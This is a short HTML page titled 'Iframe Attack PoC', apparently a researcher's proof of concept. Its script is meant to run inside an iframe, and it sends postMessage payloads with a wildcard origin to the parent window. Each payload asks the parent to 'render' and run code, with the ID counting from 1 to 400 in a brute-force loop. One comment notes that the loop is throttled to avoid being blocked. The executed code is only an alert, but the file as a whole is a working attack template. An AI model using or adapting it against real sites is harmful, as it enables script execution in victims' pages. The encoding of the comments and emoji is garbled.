<!DOCTYPE html>
<html>
<head>
  <title>Iframe Attack PoC</title>
</head>
<body>
  <h3>ğŸ“¤ Sending payload to parent window...</h3>
  <script>
    const payloadTemplate = (id) => ({
      type: "render",
      id: id,
      code: "alert(`ğŸ”¥ Code Executed! ID = ${id}`)"
    });

    let id = 1;
    const MAX_ID = 400; // Ø¬Ø±Ù‘Ø¨ Ø£ÙƒØ«Ø± Ø¥Ø°Ø§ Ù„Ø²Ù…

    const send = () => {
      if (id > MAX_ID) return;
      const payload = payloadTemplate(id);
      console.log("Trying ID: ", id);
      parent.postMessage(payload, "*");
      id++;
      setTimeout(send, 100); // Ø®ÙÙ Ø§Ù„Ø³Ø±Ø¹Ø© Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ø­Ø¸Ø±
    };

    send();
  </script>
</body>
</html>
